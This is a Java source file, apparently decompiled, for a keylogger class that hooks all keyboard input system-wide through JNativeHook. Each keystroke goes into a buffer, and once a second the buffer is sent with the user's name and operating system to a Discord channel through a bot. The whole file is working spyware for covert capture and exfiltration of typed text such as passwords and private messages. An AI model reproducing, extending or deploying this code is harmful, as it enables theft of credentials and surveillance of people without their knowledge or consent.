import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.util.Timer;
import java.util.TimerTask;

public class Keylogger implements NativeKeyListener {
   private StringBuilder logs = new StringBuilder();
   private final DiscordBot bot;
   private final Timer timer = new Timer();
   private boolean isRunning = false;

   public Keylogger(DiscordBot var1) {
      this.bot = var1;
   }

   public void start() {
      if (!this.isRunning) {
         try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(this);
            this.timer.schedule(new Keylogger.SendLogsTask(), 0L, 1000L);
            this.isRunning = true;
         } catch (NativeHookException var2) {
         }
      }

   }

   public void stop() {
      if (this.isRunning) {
         try {
            GlobalScreen.unregisterNativeHook();
            this.timer.cancel();
            this.timer.purge();
            this.isRunning = false;
         } catch (NativeHookException var2) {
         }
      }

   }

   public void nativeKeyPressed(NativeKeyEvent var1) {
      String var2 = NativeKeyEvent.getKeyText(var1.getKeyCode());
      byte var4 = -1;
      switch(var2.hashCode()) {
      case -937491361:
         if (var2.equals("Backspace")) {
            var4 = 3;
         }
         break;
      case 65929:
         if (var2.equals("Alt")) {
            var4 = 6;
         }
         break;
      case 83829:
         if (var2.equals("Tab")) {
            var4 = 2;
         }
         break;
      case 2111115:
         if (var2.equals("Ctrl")) {
            var4 = 5;
         }
         break;
      case 2394661:
         if (var2.equals("Meta")) {
            var4 = 7;
         }
         break;
      case 67114680:
         if (var2.equals("Enter")) {
            var4 = 1;
         }
         break;
      case 79854690:
         if (var2.equals("Shift")) {
            var4 = 4;
         }
         break;
      case 80085222:
         if (var2.equals("Space")) {
            var4 = 0;
         }
      }

      switch(var4) {
      case 0:
         this.logs.append(" ");
         break;
      case 1:
         this.logs.append("\n");
         break;
      case 2:
         this.logs.append("\t");
         break;
      case 3:
         if (this.logs.length() > 0) {
            this.logs.deleteCharAt(this.logs.length() - 1);
         }
      case 4:
      case 5:
      case 6:
      case 7:
         break;
      default:
         if (var2.length() == 1 && var2.matches("[A-Z]")) {
            if ((var1.getModifiers() & 17) != 0) {
               this.logs.append(var2);
            } else {
               this.logs.append(var2.toLowerCase());
            }
         } else {
            this.logs.append("[").append(var2).append("]");
         }
      }

   }

   public void nativeKeyReleased(NativeKeyEvent var1) {
   }

   public void nativeKeyTyped(NativeKeyEvent var1) {
   }

   private void sendLogsToDiscord(String var1) {
      try {
         if (var1.length() > 2000) {
            var1 = var1.substring(0, 2000);
         }

         String var2 = System.getProperty("user.name");
         String var3 = System.getProperty("os.name");
         String var4 = var2 + " - " + var3;
         String var5 = "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■";
         String var6 = "**" + var4 + "**\n" + var5 + "\n```\n" + var1 + "\n```";
         DiscordBot.sendKeylogToChannel(var6);
      } catch (Exception var7) {
      }

   }

   private class SendLogsTask extends TimerTask {
      private SendLogsTask() {
      }

      public void run() {
         if (Keylogger.this.logs.length() > 0) {
            Keylogger.this.sendLogsToDiscord(Keylogger.this.logs.toString());
            Keylogger.this.logs.setLength(0);
         }

      }

      // $FF: synthetic method
      SendLogsTask(Object var2) {
         this();
      }
   }
}
